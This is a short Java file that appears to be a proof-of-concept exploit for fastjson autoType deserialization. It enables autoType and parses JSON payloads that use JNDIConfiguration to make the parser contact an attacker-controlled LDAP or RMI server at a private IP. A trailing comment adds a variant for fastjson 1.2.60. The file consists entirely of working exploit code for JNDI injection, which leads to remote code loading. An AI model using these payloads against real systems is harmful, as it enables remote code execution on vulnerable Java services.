import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJsonTest {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonStr1 = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://10.10.20.166:1389/ExportObject\"}";
        String jsonStr2 = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://10.10.20.166:1099/ExportObject\"}";

        JSONObject json = JSON.parseObject(jsonStr2);
        json.toJSONString();
    }
}

//        fastjson 1.2.60
//        String jsonStr2 = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://10.10.20.166:1389/ExportObject\"}";